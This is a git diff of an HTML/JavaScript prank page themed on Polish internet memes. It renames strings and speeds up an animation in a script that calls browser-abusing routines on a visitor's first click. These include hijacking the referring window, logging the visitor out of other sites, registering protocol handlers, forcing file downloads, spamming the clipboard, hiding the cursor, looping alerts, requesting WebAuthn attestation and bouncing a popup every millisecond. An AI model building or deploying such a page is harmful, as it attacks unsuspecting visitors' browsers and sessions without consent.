@@ -1,7 +1,11 @@
 <html>
     <body>
+      <div class="bg">
+        <div class="content">
         <img src="CB_CZOG.jpg" alt="Cycu" width="100%" height="100%">
-        <h2>Kliknij w cyca</h2>
+        <h2>Kliknij w Don Pizzona</h2>
+        </div>
+      </div>
     </body>
    <script>
         const SCREEN_WIDTH = window.screen.availWidth
@@ -17,8 +21,7 @@ const HIDDEN_STYLE = 'position: fixed; width: 10px; height: 10px; overflow: hidd
 const SEARCHES = [
   'CB biznes',
   'cycurro',
-  'cycu',
-  'prezes'
+  'cycu'
 ]
 
 const VIDEOS = [
@@ -29,8 +32,8 @@ const VIDEOS = [
 const FILE_DOWNLOADS = [
   'CB_CZOG.jpg',
   '1CB_CZOG.jpg',
-  'Prezes_bad_ending.mp4',
-  'Prezes_good_ending.mp4'
+  'Prezes_Good_Ending.mp4',
+  'Prezes_Bad_Ending.mp4'
 ]
 
 const PHRASES = [
@@ -130,8 +133,7 @@ function init () {
     startVibrateInterval()
     enablePictureInPicture()
     triggerFileDownload()
-
-    focusWindows()
+  focusWindows()
     copySpamToClipboard()
     speak()
     startTheramin()
@@ -200,24 +202,15 @@ function initParentWindow () {
     if (interactionCount === 1) {
       
         registerProtocolHandlers()
-      
-      attemptToTakeoverReferrerWindow()
-      
-      hideCursor()
-      
-      startVideo()
-      
-      startAlertInterval()
-      
-      superLogout()
-      
-      removeHelloMessage()
-      
-      rainbowThemeColor()
-     
-      animateUrlWithEmojis()
-      
-      speak('cycurro')
+     attemptToTakeoverReferrerWindow()
+     hideCursor()
+     startVideo()
+     startAlertInterval()
+     superLogout()
+     removeHelloMessage()
+     rainbowThemeColor()
+     animateUrlWithEmojis()
+     speak('cycurro')
     }
   })
 }
@@ -632,14 +625,14 @@ function requestWebauthnAttestation () {
       publicKey: {
       // Relying Party (a.k.a. - Service):
         rp: {
-          name: 'Acme'
+          name: 'CB Biznes'
         },
 
         // User:
         user: {
           id: new Uint8Array(16),
-          name: 'lolica@jaczup.me',
-          displayName: 'Ptoszek Jaczupa'
+          name: 'Prezes@Biznes.CB',
+          displayName: 'Cycurro'
         },
 
         pubKeyCredParams: [{
@@ -1065,9 +1058,9 @@ function setupSearchWindow (win) {
 
 <script>
     // Here are the initial values for our animation. 
-    var x = 0, y = 0, w=200, h=200;  // Window position and size
+    var x = 0, y = 0, w=400, h=300;  // Window position and size
     var dx = 5, dy = 5;              // Window velocity   
-    var interval = 100;              // Milliseconds between updates
+    var interval = 1;              // Milliseconds between updates
     
     // Create the window that we're going to move around.
     // The javascript: URL is simply a way to display a short document.
@@ -1091,8 +1084,7 @@ function setupSearchWindow (win) {
             clearInterval(intervalID);
             return;
         }
-    
-        // Bounce if we have reached the right or left edge.
+      // Bounce if we have reached the right or left edge.
         if ((x+dx > (screen.availWidth - w)) || (x+dx < 0)) dx = -dx;
     
         // Bounce if we have reached the bottom or top edge.
@@ -1106,11 +1098,4 @@ function setupSearchWindow (win) {
         win.moveTo(x,y);
     }
     </script>
-    
-
-
-
-
-
-
 </html>
